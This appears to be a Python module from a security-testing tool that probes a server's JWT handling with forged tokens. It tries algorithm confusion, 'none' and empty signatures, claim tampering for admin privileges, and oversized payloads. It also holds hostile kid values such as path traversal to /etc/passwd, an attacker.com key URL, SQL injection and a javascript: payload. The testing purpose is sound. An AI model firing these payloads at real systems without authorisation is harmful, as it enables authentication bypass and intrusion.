import asyncio
import base64
import json
import uuid
from datetime import datetime, timedelta

import httpx

from ..shared.result_models import TestStatus
from .connection_manipulator import SecurityResult


class JWTSecurityTester:
    """Test JWT-specific security vulnerabilities"""

    def __init__(self, server_url: str, timeout: float = 10.0):
        self.server_url = server_url
        self.timeout = timeout

    async def test_signature_bypass_attacks(self, real_token: str, server_url: str) -> SecurityResult:
        """Test JWT signature bypass vulnerabilities"""
        test_id = str(uuid.uuid4())
        start_time = datetime.now()
        evidence = []
        vulnerability_detected = False

        try:
            evidence.append("Testing JWT signature bypass attacks...")

            # Parse the real token to understand its structure
            token_parts = self._parse_jwt(real_token)
            if not token_parts:
                evidence.append("Failed to parse provided JWT token")
                # Create a sample token for testing
                token_parts = self._create_sample_jwt_parts()

            header, payload, signature = token_parts
            evidence.append(f"Original JWT algorithm: {header.get('alg', 'unknown')}")

            async with httpx.AsyncClient(timeout=self.timeout) as client:
                # Test 1: Algorithm confusion attacks (RS256 -> HS256)
                if header.get("alg") == "RS256":
                    # Create HS256 version of the same token
                    modified_header = header.copy()
                    modified_header["alg"] = "HS256"

                    hs256_token = self._create_jwt_with_modified_header(
                        modified_header, payload, "fake_secret"
                    )

                    response = await self._test_token_access(client, hs256_token)
                    if response["accepted"]:
                        vulnerability_detected = True
                        evidence.append(
                            "VULNERABILITY: RS256 -> HS256 algorithm confusion successful"
                        )
                    else:
                        evidence.append("Algorithm confusion properly prevented")

                # Test 2: None algorithm acceptance vulnerability
                none_header = header.copy()
                none_header["alg"] = "none"

                # Create unsigned token with 'none' algorithm
                none_token = self._create_unsigned_jwt(none_header, payload)

                response = await self._test_token_access(client, none_token)
                if response["accepted"]:
                    vulnerability_detected = True
                    evidence.append(
                        "VULNERABILITY: 'none' algorithm token accepted"
                    )
                else:
                    evidence.append("'none' algorithm properly rejected")

                # Test 3: Empty signature acceptance
                empty_sig_token = f"{self._encode_jwt_part(header)}.{self._encode_jwt_part(payload)}."

                response = await self._test_token_access(client, empty_sig_token)
                if response["accepted"]:
                    vulnerability_detected = True
                    evidence.append(
                        "VULNERABILITY: Token with empty signature accepted"
                    )
                else:
                    evidence.append("Empty signature properly rejected")

                # Test 4: Modified signature variations
                signature_tests = [
                    "invalid_signature",
                    "A" * 64,  # Wrong length
                    "",  # Empty
                    "null",  # Null string
                    signature[::-1] if signature else "reversed",  # Reversed signature
                ]

                for test_sig in signature_tests:
                    modified_token = f"{self._encode_jwt_part(header)}.{self._encode_jwt_part(payload)}.{test_sig}"

                    response = await self._test_token_access(client, modified_token)
                    if response["accepted"]:
                        vulnerability_detected = True
                        evidence.append(
                            f"VULNERABILITY: Token with invalid signature accepted: {test_sig[:20]}..."
                        )

                # Test 5: Key confusion attacks using public keys as HMAC secrets
                if header.get("alg") == "RS256":
                    # Test if server accepts HS256 signed with public key
                    public_key_header = header.copy()
                    public_key_header["alg"] = "HS256"

                    # Sign with a known public key string (common attack vector)
                    public_key_strings = [
                        "-----BEGIN PUBLIC KEY-----",
                        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A",
                        "public_key_here",
                    ]

                    for pub_key in public_key_strings:
                        pub_key_token = self._create_jwt_with_modified_header(
                            public_key_header, payload, pub_key
                        )

                        response = await self._test_token_access(client, pub_key_token)
                        if response["accepted"]:
                            vulnerability_detected = True
                            evidence.append(
                                "VULNERABILITY: Public key used as HMAC secret accepted"
                            )

            end_time = datetime.now()

            return SecurityResult(
                test_id=test_id,
                test_name="JWT Signature Bypass Test",
                attack_type="jwt_signature_bypass",
                vulnerability_detected=vulnerability_detected,
                success=not vulnerability_detected,
                severity="critical" if vulnerability_detected else "low",
                evidence=evidence,
                start_time=start_time,
                end_time=end_time,
                duration=(end_time - start_time).total_seconds(),
                status=TestStatus.COMPLETED,
            )

        except Exception as e:
            end_time = datetime.now()
            return SecurityResult(
                test_id=test_id,
                test_name="JWT Signature Bypass Test",
                attack_type="jwt_signature_bypass",
                vulnerability_detected=False,
                success=False,
                severity="medium",
                evidence=[*evidence, f"Test failed: {e!s}"],
                start_time=start_time,
                end_time=end_time,
                duration=(end_time - start_time).total_seconds(),
                status=TestStatus.FAILED,
                error_message=str(e),
            )

    async def test_token_validation_bypass(self, real_token: str) -> SecurityResult:
        """Test JWT validation bypass techniques"""
        test_id = str(uuid.uuid4())
        start_time = datetime.now()
        evidence = []
        vulnerability_detected = False

        try:
            evidence.append("Testing JWT validation bypass techniques...")

            # Parse the real token
            token_parts = self._parse_jwt(real_token)
            if not token_parts:
                evidence.append("Failed to parse provided JWT token")
                token_parts = self._create_sample_jwt_parts()

            header, payload, signature = token_parts

            async with httpx.AsyncClient(timeout=self.timeout) as client:
                # Test 1: Token replay attacks across different contexts
                replay_contexts = [
                    {"X-Context": "admin"},
                    {"X-User-Role": "administrator"},
                    {"X-Tenant": "different_tenant"},
                    {"Host": "different-service.com"},
                ]

                for context_headers in replay_contexts:
                    response = await self._test_token_access(client, real_token, context_headers)
                    if response["accepted"]:
                        vulnerability_detected = True
                        evidence.append(
                            f"VULNERABILITY: Token replay successful in different context: {context_headers}"
                        )

                # Test 2: Scope elevation via claims manipulation
                elevated_payloads = [
                    {**payload, "scope": "admin read write delete"},
                    {**payload, "roles": ["admin", "superuser"]},
                    {**payload, "permissions": ["*"]},
                    {**payload, "aud": "*"},  # Wildcard audience
                    {**payload, "sub": "admin"},  # Admin subject
                ]

                for elevated_payload in elevated_payloads:
                    elevated_token = self._create_jwt_with_modified_payload(
                        header, elevated_payload, signature
                    )

                    response = await self._test_token_access(client, elevated_token)
                    if response["accepted"]:
                        vulnerability_detected = True
                        evidence.append(
                            "VULNERABILITY: Scope elevation via claims manipulation successful"
                        )

                # Test 3: Audience bypass via aud claim modification
                audience_bypass_payloads = [
                    {**payload, "aud": ""},  # Empty audience
                    {**payload, "aud": "*"},  # Wildcard audience
                    {**payload, "aud": ["original", "malicious"]},  # Multiple audiences
                    {**payload},  # Remove aud claim entirely
                ]

                # Remove aud from last test case
                if "aud" in audience_bypass_payloads[-1]:
                    del audience_bypass_payloads[-1]["aud"]

                for bypass_payload in audience_bypass_payloads:
                    bypass_token = self._create_jwt_with_modified_payload(
                        header, bypass_payload, signature
                    )

                    response = await self._test_token_access(client, bypass_token)
                    if response["accepted"]:
                        vulnerability_detected = True
                        evidence.append(
                            "VULNERABILITY: Audience validation bypass successful"
                        )

                # Test 4: Time-based attacks (exp, nbf, iat manipulation)
                now = datetime.utcnow()
                time_attack_payloads = [
                    {**payload, "exp": int((now + timedelta(days=365)).timestamp())},  # Far future expiration
                    {**payload, "exp": 9999999999},  # Very far future
                    {**payload, "nbf": int((now - timedelta(days=1)).timestamp())},  # Not before in past
                    {**payload, "iat": int((now + timedelta(hours=1)).timestamp())},  # Issued in future
                    {**payload},  # Remove exp claim entirely
                ]

                # Remove exp from last test case
                if "exp" in time_attack_payloads[-1]:
                    del time_attack_payloads[-1]["exp"]

                for time_payload in time_attack_payloads:
                    time_token = self._create_jwt_with_modified_payload(
                        header, time_payload, signature
                    )

                    response = await self._test_token_access(client, time_token)
                    if response["accepted"] and time_payload.get("exp", 0) > now.timestamp() + 86400:
                        vulnerability_detected = True
                        evidence.append(
                            "VULNERABILITY: Time-based validation bypass successful"
                        )

                # Test 5: Critical claims bypass
                critical_bypass_tests = [
                    {**payload, "jti": ""},  # Empty JWT ID
                    {**payload, "iss": ""},  # Empty issuer
                    {**payload, "iss": "attacker.com"},  # Wrong issuer
                    {**payload},  # Remove issuer entirely
                ]

                # Remove iss from last test case
                if "iss" in critical_bypass_tests[-1]:
                    del critical_bypass_tests[-1]["iss"]

                for bypass_payload in critical_bypass_tests:
                    bypass_token = self._create_jwt_with_modified_payload(
                        header, bypass_payload, signature
                    )

                    response = await self._test_token_access(client, bypass_token)
                    if response["accepted"]:
                        vulnerability_detected = True
                        evidence.append(
                            "VULNERABILITY: Critical claims validation bypass successful"
                        )

            end_time = datetime.now()

            return SecurityResult(
                test_id=test_id,
                test_name="JWT Validation Bypass Test",
                attack_type="jwt_validation_bypass",
                vulnerability_detected=vulnerability_detected,
                success=not vulnerability_detected,
                severity="high" if vulnerability_detected else "low",
                evidence=evidence,
                start_time=start_time,
                end_time=end_time,
                duration=(end_time - start_time).total_seconds(),
                status=TestStatus.COMPLETED,
            )

        except Exception as e:
            end_time = datetime.now()
            return SecurityResult(
                test_id=test_id,
                test_name="JWT Validation Bypass Test",
                attack_type="jwt_validation_bypass",
                vulnerability_detected=False,
                success=False,
                severity="medium",
                evidence=[*evidence, f"Test failed: {e!s}"],
                start_time=start_time,
                end_time=end_time,
                duration=(end_time - start_time).total_seconds(),
                status=TestStatus.FAILED,
                error_message=str(e),
            )

    async def test_jwt_injection_attacks(self, real_token: str) -> SecurityResult:
        """Test JWT injection and manipulation attacks"""
        test_id = str(uuid.uuid4())
        start_time = datetime.now()
        evidence = []
        vulnerability_detected = False

        try:
            evidence.append("Testing JWT injection and manipulation attacks...")

            # Parse the real token
            token_parts = self._parse_jwt(real_token)
            if not token_parts:
                evidence.append("Failed to parse provided JWT token")
                token_parts = self._create_sample_jwt_parts()

            header, payload, signature = token_parts

            async with httpx.AsyncClient(timeout=self.timeout) as client:
                # Test 1: Header injection via kid parameter manipulation
                kid_injection_headers = [
                    {**header, "kid": "../../../etc/passwd"},
                    {**header, "kid": "http://attacker.com/key"},
                    {**header, "kid": "'; DROP TABLE keys; --"},
                    {**header, "kid": "javascript:alert(1)"},
                    {**header, "kid": "\x00\x01\x02"},  # Null bytes
                ]

                for injection_header in kid_injection_headers:
                    injection_token = self._create_jwt_with_modified_header(
                        injection_header, payload, "fake_key"
                    )

                    response = await self._test_token_access(client, injection_token)
                    if response["accepted"] or response.get("error_reveals_info", False):
                        vulnerability_detected = True
                        evidence.append(
                            f"VULNERABILITY: Header injection via kid parameter: {injection_header['kid'][:30]}..."
                        )

                # Test 2: Claims injection via JSON structure manipulation
                json_injection_payloads = [
                    '{"sub":"user","admin":true}',
                    '{"sub":"user","role":"admin","sub":"admin"}',  # Duplicate key attack
                    '{"sub":"user"} {"admin":true}',  # JSON concatenation
                    '{"sub":"user","nested":{"admin":true}}',
                    '{"sub":"user","permissions":["read","write","admin"]}',
                ]

                for json_payload in json_injection_payloads:
                    try:
                        # Encode the malicious JSON as base64
                        malicious_payload_b64 = base64.urlsafe_b64encode(
                            json_payload.encode()
                        ).decode().rstrip("=")

                        injection_token = f"{self._encode_jwt_part(header)}.{malicious_payload_b64}.{signature}"

                        response = await self._test_token_access(client, injection_token)
                        if response["accepted"]:
                            vulnerability_detected = True
                            evidence.append(
                                f"VULNERABILITY: JSON structure injection successful: {json_payload[:50]}..."
                            )

                    except Exception as e:
                        evidence.append(f"JSON injection test failed: {str(e)[:50]}")

                # Test 3: JWT confusion attacks (mixing signed/unsigned tokens)
                confusion_attacks = [
                    # Mix signed header with unsigned payload
                    f"{self._encode_jwt_part(header)}.{self._encode_jwt_part({'admin': True})}.fake_sig",
                    # Multiple JWT tokens concatenated
                    f"{real_token}.{real_token}",
                    # Token with extra parts
                    f"{real_token}.extra_part",
                    # Malformed structure
                    f"{real_token[:-10]}malformed",
                ]

                for confusion_token in confusion_attacks:
                    response = await self._test_token_access(client, confusion_token)
                    if response["accepted"]:
                        vulnerability_detected = True
                        evidence.append(
                            "VULNERABILITY: JWT confusion attack successful"
                        )

                # Test 4: Unicode and encoding attacks
                encoding_attacks = [
                    # Unicode normalization attacks
                    {**payload, "sub": "admin\u0000"},
                    {**payload, "role": "user\uFEFFadmin"},  # Zero-width space
                    {**payload, "permissions": ["read", "write", "admin\u200B"]},  # Zero-width space
                ]

                for encoding_payload in encoding_attacks:
                    encoding_token = self._create_jwt_with_modified_payload(
                        header, encoding_payload, signature
                    )

                    response = await self._test_token_access(client, encoding_token)
                    if response["accepted"]:
                        vulnerability_detected = True
                        evidence.append(
                            "VULNERABILITY: Unicode/encoding attack successful"
                        )

                # Test 5: Large payload attacks (DoS)
                large_payload = {
                    **payload,
                    "large_field": "A" * 10000,  # 10KB field
                    "many_fields": {f"field_{i}": f"value_{i}" for i in range(100)},
                }

                try:
                    large_token = self._create_jwt_with_modified_payload(
                        header, large_payload, signature
                    )

                    # Test with shorter timeout for large payload
                    response = await asyncio.wait_for(
                        self._test_token_access(client, large_token),
                        timeout=5.0
                    )

                    if response["accepted"]:
                        evidence.append("Large payload token processed successfully")

                except TimeoutError:
                    vulnerability_detected = True
                    evidence.append(
                        "VULNERABILITY: Large payload causes processing timeout (potential DoS)"
                    )

            end_time = datetime.now()

            return SecurityResult(
                test_id=test_id,
                test_name="JWT Injection Attacks Test",
                attack_type="jwt_injection",
                vulnerability_detected=vulnerability_detected,
                success=not vulnerability_detected,
                severity="high" if vulnerability_detected else "low",
                evidence=evidence,
                start_time=start_time,
                end_time=end_time,
                duration=(end_time - start_time).total_seconds(),
                status=TestStatus.COMPLETED,
            )

        except Exception as e:
            end_time = datetime.now()
            return SecurityResult(
                test_id=test_id,
                test_name="JWT Injection Attacks Test",
                attack_type="jwt_injection",
                vulnerability_detected=False,
                success=False,
                severity="medium",
                evidence=[*evidence, f"Test failed: {e!s}"],
                start_time=start_time,
                end_time=end_time,
                duration=(end_time - start_time).total_seconds(),
                status=TestStatus.FAILED,
                error_message=str(e),
            )

    # Helper methods

    def _parse_jwt(self, token: str) -> tuple | None:
        """Parse JWT token into header, payload, signature"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            header = json.loads(
                base64.urlsafe_b64decode(parts[0] + "=" * (-len(parts[0]) % 4))
            )
            payload = json.loads(
                base64.urlsafe_b64decode(parts[1] + "=" * (-len(parts[1]) % 4))
            )
            signature = parts[2]

            return header, payload, signature
        except Exception:
            return None

    def _create_sample_jwt_parts(self) -> tuple:
        """Create sample JWT parts for testing"""
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "sub": "test_user",
            "iss": "test_issuer",
            "aud": "test_audience",
            "exp": int(datetime.utcnow().timestamp()) + 3600,
            "iat": int(datetime.utcnow().timestamp()),
        }
        signature = "sample_signature"

        return header, payload, signature

    def _encode_jwt_part(self, part_dict: dict) -> str:
        """Encode JWT part as base64"""
        json_str = json.dumps(part_dict, separators=(',', ':'))
        return base64.urlsafe_b64encode(json_str.encode()).decode().rstrip("=")

    def _create_jwt_with_modified_header(self, header: dict, payload: dict, secret: str) -> str:
        """Create JWT with modified header (simplified signing for testing)"""
        header_b64 = self._encode_jwt_part(header)
        payload_b64 = self._encode_jwt_part(payload)

        # For testing purposes, create a fake signature
        import hashlib
        fake_signature = hashlib.sha256(f"{header_b64}.{payload_b64}.{secret}".encode()).hexdigest()[:32]

        return f"{header_b64}.{payload_b64}.{fake_signature}"

    def _create_jwt_with_modified_payload(self, header: dict, payload: dict, original_signature: str) -> str:
        """Create JWT with modified payload (keeping original signature for testing)"""
        header_b64 = self._encode_jwt_part(header)
        payload_b64 = self._encode_jwt_part(payload)

        return f"{header_b64}.{payload_b64}.{original_signature}"

    def _create_unsigned_jwt(self, header: dict, payload: dict) -> str:
        """Create unsigned JWT token"""
        header_b64 = self._encode_jwt_part(header)
        payload_b64 = self._encode_jwt_part(payload)

        # Empty signature for 'none' algorithm
        return f"{header_b64}.{payload_b64}."

    async def _test_token_access(self, client: httpx.AsyncClient, token: str, extra_headers: dict | None = None) -> dict:
        """Test token access and return result"""
        headers = {"Authorization": f"Bearer {token}"}
        if extra_headers:
            headers.update(extra_headers)

        try:
            response = await client.get(self.server_url, headers=headers)

            # Check for information disclosure in error messages
            error_reveals_info = False
            if response.status_code >= 400:
                error_text = response.text.lower()
                info_indicators = [
                    "invalid signature",
                    "token expired",
                    "algorithm mismatch",
                    "key not found",
                    "sql",
                    "database",
                    "stack trace",
                ]
                error_reveals_info = any(indicator in error_text for indicator in info_indicators)

            return {
                "accepted": response.status_code == 200,
                "status_code": response.status_code,
                "error_reveals_info": error_reveals_info,
                "response_text": response.text[:200],  # First 200 chars for analysis
            }

        except Exception as e:
            return {
                "accepted": False,
                "status_code": 0,
                "error_reveals_info": False,
                "error": str(e)[:100],
            }
